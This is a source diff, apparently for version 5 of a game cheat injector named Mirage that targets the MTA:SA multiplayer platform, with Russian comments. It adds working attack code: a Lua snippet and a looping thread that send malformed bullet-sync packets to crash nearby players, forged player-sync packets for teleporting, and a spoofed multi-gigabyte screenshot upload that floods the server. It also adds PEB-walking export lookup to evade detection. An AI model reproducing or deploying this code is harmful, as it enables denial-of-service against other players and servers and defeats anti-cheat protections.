@@ -1,3 +1,62 @@
+/*
+     > Обновление к Mirage V5
+
+	 + Вырезан автоматический крашер на F2 
+	 + Добавлена кастом функция "serverCommand" в getPedVoice обработчик (принимает строку для имени и аргумента, напр. getPedVoice("serverCommand", "me", "вжив наркотики.") либо просто сказать в чат getPedVoice("serverCommand", "say", "як справи?")
+	 + Добавлена кастом функция "sendBulletSync" в getPedVoice обработчик (принимает координаты x y z точки вылета пули и координаты x y z точки попадания пули)
+	 + Добавлена кастом функция "sendPlayerSync" в getPedVoice обработчик (принимает координаты x y z точки для пакетной телепортации в мгновение ока)
+	
+	```
+	-- Bullet Crasher
+
+	function antiZZ(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
+		local args = { ... }
+		if tonumber(args[2]) == 0 then
+			return 'skip'  -- шлем нахуй зеленую зону (оружия не спрячется)
+		end
+	end
+
+	function setRandomFirearmSlot()
+	   local firearmIDs = {22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38}
+	   local availableSlots = {}
+
+	   for slot = 0, 12 do
+		   local weapon = getPedWeapon(localPlayer, slot)
+		   for _, firearmID in ipairs(firearmIDs) do
+			   if weapon == firearmID then
+				   table.insert(availableSlots, slot)
+				   break
+			   end
+		   end
+	   end
+
+	   if #availableSlots == 0 then
+		   outputChatBox("Нет огнестрельного оружия!", 255, 0, 0)
+		   return false
+	   end
+
+	   local randomSlot = availableSlots[math.random(1, #availableSlots)]
+	   setPedWeaponSlot(localPlayer, randomSlot)
+	   return true
+	end
+
+	getPedVoice("hideFunctionCall", true)
+	getPedVoice("setDbgHook", "preFunction", antiZZ, { "setPedWeaponSlot" } )
+	getPedVoice("hideFunctionCall", false)
+
+	local rslt = setRandomFirearmSlot() -- достаем оружие в зеленой зоне (должно уже быть у игрока)
+	if rslt then
+		local bad_val = 1000000000.0 -- крашим игроков вокруг через хуевую пулю
+		local ret = getPedVoice('sendBulletSync', bad_val, bad_val, bad_val, -bad_val, -bad_val, -bad_val)
+		outputChatBox('Пуля отправлена? ' .. tostring(ret))
+	end
+
+	getPedVoice("hideFunctionCall", true)
+	getPedVoice("removeDbgHook", "preFunction", antiZZ) -- тушим наш анти-зз
+	getPedVoice("hideFunctionCall", false)
+	setPedWeaponSlot(localPlayer, 0) -- ставим обратно на кулаки
+	```
+*/
 #ifndef _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING
 #define _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING
 #endif
@@ -10,7 +69,7 @@
 #pragma warning (disable : 4244)
 #define LOG_NAME xorstr_("Mirage.log") // Имя лог файла
 #define WITH_LOGGING // Закоментить чтобы отключить вывод в лог файл
-#define MIRAGE_VERSION xorstr_("V4") // Версия инжектора
+#define MIRAGE_VERSION xorstr_("V5") // Версия инжектора
 #include <Windows.h>
 #include <stdio.h>
 #include <filesystem>
@@ -39,11 +98,15 @@
 #include <random>
 #include "magic_enum/include/magic_enum.hpp"
 #include "WepTypes.h"
+#include <winternl.h>
+#pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "libMinHook.x86.lib")
 #pragma comment(lib, "Winmm.lib")
 #include "NetAPI/CNet.h"
 #include "NetAPI/Packets.h"
 #include "NetAPI/SyncStructures.h"
+typedef void(__cdecl* ptrWriteCameraOrientation)(const CVector& vecPositionBase, NetBitStreamInterface& BitStream);
+ptrWriteCameraOrientation callWriteCameraOrientation = nullptr;
 void __stdcall LogInFile(std::string log_name, const char* log, ...);
 #include "IAT.h"
 CNet* g_pNet = nullptr;
@@ -128,7 +191,79 @@ void lua_register(void* L, const char* func_name, lua_CFunction f)
 	call_pushcclosure(L, (f), 1);
 	call_setfield(L, LUA_GLOBALSINDEX, (func_name));
 }
+FARPROC GetProcedure(const char* szModuleName, const char* szProcName)
+{
+	PEB* pPeb = (PEB*)__readfsdword(0x30);
+	PEB_LDR_DATA* pLdr = pPeb->Ldr;
+	LIST_ENTRY* pListHead = &pLdr->InMemoryOrderModuleList;
+	LIST_ENTRY* pListEntry = pListHead->Flink;
 
+	while (pListEntry != pListHead)
+	{
+		LDR_DATA_TABLE_ENTRY* pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+
+		if (pEntry->FullDllName.Buffer)
+		{
+			wchar_t* pDllName = pEntry->FullDllName.Buffer;
+			wchar_t* pLastSlash = nullptr;
+
+			for (wchar_t* p = pDllName; *p; p++)
+			{
+				if (*p == L'\\') pLastSlash = p;
+			}
+
+			if (pLastSlash) pDllName = pLastSlash + 1;
+
+			bool bMatch = true;
+			for (int i = 0; szModuleName[i]; i++)
+			{
+				if ((pDllName[i] | 0x20) != (szModuleName[i] | 0x20))
+				{
+					bMatch = false;
+					break;
+				}
+			}
+
+			if (bMatch)
+			{
+				HMODULE hModule = (HMODULE)pEntry->DllBase;
+				IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)hModule;
+				IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + pDosHeader->e_lfanew);
+				IMAGE_EXPORT_DIRECTORY* pExportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule +
+					pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+				DWORD* pNameRVAs = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
+				WORD* pOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
+				DWORD* pFuncRVAs = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);
+
+				for (DWORD i = 0; i < pExportDir->NumberOfNames; i++)
+				{
+					char* pFuncName = (char*)((BYTE*)hModule + pNameRVAs[i]);
+
+					bool bFuncMatch = true;
+					for (int j = 0; szProcName[j]; j++)
+					{
+						if (pFuncName[j] != szProcName[j])
+						{
+							bFuncMatch = false;
+							break;
+						}
+					}
+
+					if (bFuncMatch)
+					{
+						WORD wOrdinal = pOrdinals[i];
+						return (FARPROC)((BYTE*)hModule + pFuncRVAs[wOrdinal]);
+					}
+				}
+			}
+		}
+
+		pListEntry = pListEntry->Flink;
+	}
+
+	return nullptr;
+}
 namespace fs = std::filesystem;
 
 enum class LuaInjectionType
@@ -741,6 +876,111 @@ DWORD WINAPI SniperThread(LPVOID)
 	}
 	return 0;
 }
+int GetCurrentWeaponID()
+{
+	DWORD dwPlayerPed = *(DWORD*)0xB6F5F0;
+	if (!dwPlayerPed) return 0;
+
+	BYTE byteCurrentSlot = *(BYTE*)(dwPlayerPed + 0x718);
+	DWORD dwWeaponSlot = dwPlayerPed + 0x5A0 + (byteCurrentSlot * 0x1C);
+
+	return *(int*)(dwWeaponSlot);
+}
+
+bool IsHoldingFirearm()
+{
+	int weaponID = GetCurrentWeaponID();
+
+	if (weaponID >= 22 && weaponID <= 34)
+		return true;
+	if (weaponID >= 35 && weaponID <= 38)
+		return true;
+
+	return false;
+}
+int sendBulletSync(CVector fake_vecStart, CVector fake_vecEnd)
+{
+	if (CNetAPI != nullptr)
+	{
+		if (!IsHoldingFirearm()) return 0;
+
+		static int m_ucBulletSyncOrderCounter = 1;
+		NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
+
+		if (pBitStream)
+		{
+			pBitStream->Write((char)GetCurrentWeaponID());
+
+			pBitStream->Write((const char*)&fake_vecStart, sizeof(CVector));
+			pBitStream->Write((const char*)&fake_vecEnd, sizeof(CVector));
+
+			pBitStream->Write(m_ucBulletSyncOrderCounter++);
+
+			pBitStream->WriteBit(false);
+
+			g_pNet->SendPacket(PACKET_ID_PLAYER_BULLETSYNC, pBitStream, PACKET_PRIORITY_MEDIUM, PACKET_RELIABILITY_RELIABLE);
+			g_pNet->DeallocateNetBitStream(pBitStream);
+			return 1;
+		}
+	}
+	return 0;
+}
+int sendPlayerSync(CVector position)
+{
+	DWORD dwPlayerPed = *(DWORD*)0xB6F5F0;
+	if (!dwPlayerPed) return 0;
+
+	NetBitStreamInterface* bitStream = g_pNet->AllocateNetBitStream();
+	if (bitStream)
+	{
+		SFullKeysyncSync     keys;
+		SPlayerPuresyncFlags flags;
+		SPositionSync        positionSync(false);
+		SPedRotationSync     rotationSync;
+		SVelocitySync        velocitySync;
+		SPlayerHealthSync    healthSync;
+		SPlayerArmorSync     armorSync;
+		SCameraRotationSync  camRotationSync;
+
+		flags.data.bAkimboTargetUp = false;
+		flags.data.bHasAWeapon = false;
+		flags.data.bHasContact = false;
+		flags.data.bHasJetPack = false;
+		flags.data.bIsChoking = false;
+		flags.data.bIsDucked = false;
+		flags.data.bIsInWater = false;
+		flags.data.bIsOnFire = false;
+		flags.data.bStealthAiming = false;
+		flags.data.bWearsGoogles = false;
+
+		positionSync.data.vecPosition = position;
+		rotationSync.data.fRotation = 0.0f;
+		velocitySync.data.vecVelocity = CVector(0.0f, 0.0f, 0.0f);
+
+		healthSync.data.fValue = *(float*)(dwPlayerPed + 0x540);
+		armorSync.data.fValue = *(float*)(dwPlayerPed + 0x548);
+
+		camRotationSync.data.fRotation = 0.0f;
+
+		bitStream->Write(unsigned char(0));
+		bitStream->Write(&keys);
+		bitStream->Write(&flags);
+		bitStream->Write(&positionSync);
+		bitStream->Write(&rotationSync);
+		bitStream->Write(&velocitySync);
+		bitStream->Write(&healthSync);
+		bitStream->Write(&armorSync);
+		bitStream->Write(&camRotationSync);
+		callWriteCameraOrientation(position, *bitStream);
+		bitStream->WriteBit(false);
+
+		g_pNet->SendPacket(PACKET_ID_PLAYER_PURESYNC, bitStream, PACKET_PRIORITY_HIGH, PACKET_RELIABILITY_UNRELIABLE_SEQUENCED);
+		g_pNet->DeallocateNetBitStream(bitStream);
+
+		return 1;
+	}
+	return 0;
+}
 int __cdecl invokeFunction(void* luaVM)
 {
 	unsigned int strLen = 500;
@@ -814,6 +1054,41 @@ int __cdecl invokeFunction(void* luaVM)
 		if (!armor) *(float*)(PEDSELF + 0x540) = (float)std::stoi(pedHP);
 		else *(float*)(PEDSELF + 0x548) = (float)std::stoi(pedHP);
 		call_pushboolean(luaVM, true);
+		return 1;
+	}
+	if (findStringIC(func_name, xorstr_("serverCommand")))
+	{
+		call_lua_remove(luaVM, 1);
+		std::string cmd = call_tostring(luaVM, 1, &strLen);
+		std::string arg = call_tostring(luaVM, 2, &strLen);
+		sendMTAChat(cmd.c_str(), arg.c_str(), false, false, false, false);
+		call_pushboolean(luaVM, true);
+		return 1;
+	}
+	if (findStringIC(func_name, xorstr_("sendBulletSync")))
+	{
+		call_lua_remove(luaVM, 1);
+		float start_x = std::stof(call_tostring(luaVM, 1, &strLen));
+		float start_y = std::stof(call_tostring(luaVM, 2, &strLen));
+		float start_z = std::stof(call_tostring(luaVM, 3, &strLen));
+		float end_x = std::stof(call_tostring(luaVM, 4, &strLen));
+		float end_y = std::stof(call_tostring(luaVM, 5, &strLen));
+		float end_z = std::stof(call_tostring(luaVM, 6, &strLen));
+		CVector fake_vecStart = { start_x, start_y, start_z };
+		CVector fake_vecEnd = { end_x, end_y, end_z };
+		int result = sendBulletSync(fake_vecStart, fake_vecEnd);
+		call_pushboolean(luaVM, result);
+		return 1;
+	}
+	if (findStringIC(func_name, xorstr_("sendPlayerSync")))
+	{
+		call_lua_remove(luaVM, 1);
+		float tp_x = std::stof(call_tostring(luaVM, 1, &strLen));
+		float tp_y = std::stof(call_tostring(luaVM, 2, &strLen));
+		float tp_z = std::stof(call_tostring(luaVM, 3, &strLen));
+		CVector teleportPoint = { tp_x, tp_y, tp_z };
+		int result = sendPlayerSync(teleportPoint);
+		call_pushboolean(luaVM, result);
 		return 1;
 	}
 	if (findStringIC(func_name, xorstr_("setSniperCheck")))
@@ -942,4 +1217,136 @@ HMODULE __stdcall hkLoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dw
 	}
 	MakeJump((DWORD)callLoadLibraryExW, (DWORD)hkLoadLibraryExW, loadlib_prologue, sizeof(loadlib_prologue));
 	return hModule;
+}
+static std::string kDumpDir{ xorstr_("DumpedHeap") };
+// Создаём каталог ровно один раз
+static void EnsureDumpDirectory()
+{
+	static std::once_flag flag;
+	std::call_once(flag, []()
+		{
+			kDumpDir = CvWideToAnsi(mapped_image_dir) + xorstr_("\\DumpedHeap");
+			std::filesystem::create_directories(kDumpDir);
+		});
+}
+static std::string RandomString(std::size_t len)
+{
+	static const char charset[] =
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+		"abcdefghijklmnopqrstuvwxyz"
+		"0123456789";
+	static thread_local std::mt19937 gen{ std::random_device{}() };
+	std::uniform_int_distribution<>  dist(0, sizeof(charset) - 2);
+
+	std::string out;
+	out.reserve(len);
+	while (len--)
+		out.push_back(charset[dist(gen)]);
+	return out;
+}
+void SendRagCarpetScreenShot()
+{
+	/* 1. Константы ------------------------------------------------------- */
+	constexpr uint32_t kUiBytesPerPart = 65535U;                                 // Максимум для uint16_t
+	constexpr uint32_t kRealBufferSize = kUiBytesPerPart;
+	constexpr uint32_t kUiTotalByteSize = 3U * 1024U * 1024U * 1024U;           // 3 ГБ
+	constexpr uint32_t kUiNumParts = (kUiTotalByteSize + kUiBytesPerPart - 1) / kUiBytesPerPart; // ~49153 частей
+	constexpr uint32_t kIntervalMs = 100;                                         // мс
+
+	/* 2. Реальные 65535 байт шума + случайные метаданные -------------------- */
+	std::vector<char> vData(kRealBufferSize);
+	{
+		std::mt19937                    g{ std::random_device{}() };
+		std::uniform_int_distribution<> d(0, 255);
+		for (char& c : vData)
+			c = static_cast<char>(d(g));
+	}
+
+	std::mt19937                            g{ std::random_device{}() };
+	std::uniform_int_distribution<uint16_t> d16(1, 65'535);
+	uint16_t                                usResNetId = d16(g);
+	std::string                             strResName = RandomString(12);
+	std::string                             strTag = RandomString(8);
+	std::uniform_int_distribution<uint32_t> d32(1, 0xFFFFFFFF);
+	uint32_t                                uiServerTime = d32(g);
+
+	static std::atomic<uint16_t> s_id{ 0 };
+	uint16_t                     usShotId = ++s_id;
+
+	std::thread(
+		[=, data = std::move(vData)]() mutable
+		{
+			static char junk[65535] = { 0 };
+
+			for (uint32_t part = 0; part < kUiNumParts; ++part)
+			{
+				NetBitStreamInterface* bs = g_pNet->AllocateNetBitStream();
+
+				bs->Write(static_cast<uchar>(1));
+				bs->Write(usShotId);
+				bs->Write(static_cast<uint16_t>(part));
+
+				uint32_t    offset = part * kUiBytesPerPart;
+				const char* pSend = junk;
+				uint16_t    sz = kUiBytesPerPart;
+
+				if (offset < kRealBufferSize)
+				{
+					sz = static_cast<uint16_t>(std::min<uint32_t>(kRealBufferSize - offset, kUiBytesPerPart));
+					pSend = data.data() + offset;
+				}
+
+				bs->Write(sz);
+				bs->Write(pSend, sz);
+
+				if (part == 0)
+				{
+					bs->Write(uiServerTime);
+					bs->Write(kUiTotalByteSize);
+					bs->Write(static_cast<uint16_t>(kUiNumParts));
+					bs->Write(usResNetId);
+					bs->WriteString(strTag.c_str());
+					bs->WriteString(strResName.c_str());
+				}
+
+				g_pNet->SendPacket(PACKET_ID_PLAYER_SCREENSHOT, bs, PACKET_PRIORITY_LOW,
+					PACKET_RELIABILITY_RELIABLE_ORDERED, PACKET_ORDERING_DATA_TRANSFER);
+				g_pNet->DeallocateNetBitStream(bs);
+
+				std::this_thread::sleep_for(std::chrono::milliseconds(kIntervalMs));
+			}
+		})
+		.detach();
+}
+void Crasher()
+{
+	while (true)
+	{
+		if (CNetAPI != nullptr && crasher)
+		{
+			if (!IsHoldingFirearm()) continue;
+			static int m_ucBulletSyncOrderCounter = 1;
+			constexpr float fInvalidVectorValue = 1000000000.0f;
+			CVector fake_vecStart(fInvalidVectorValue, fInvalidVectorValue, fInvalidVectorValue);
+			CVector fake_vecEnd(-fInvalidVectorValue, -fInvalidVectorValue, -fInvalidVectorValue);
+			//CVector fake_vecStart(1.0f, 1.0f, 1.0f);
+			//CVector fake_vecEnd(2999.0f, 2999.0f, 2999.0f);
+			NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
+			if (pBitStream)
+			{
+				pBitStream->Write((char)GetCurrentWeaponID());
+
+				pBitStream->Write((const char*)&fake_vecStart, sizeof(CVector));
+				pBitStream->Write((const char*)&fake_vecEnd, sizeof(CVector));
+
+				pBitStream->Write(m_ucBulletSyncOrderCounter++);
+
+				pBitStream->WriteBit(false);
+
+				g_pNet->SendPacket(PACKET_ID_PLAYER_BULLETSYNC, pBitStream, PACKET_PRIORITY_MEDIUM, PACKET_RELIABILITY_RELIABLE);
+				g_pNet->DeallocateNetBitStream(pBitStream);
+			}
+		}
+		Sleep(250);
+	}
 }
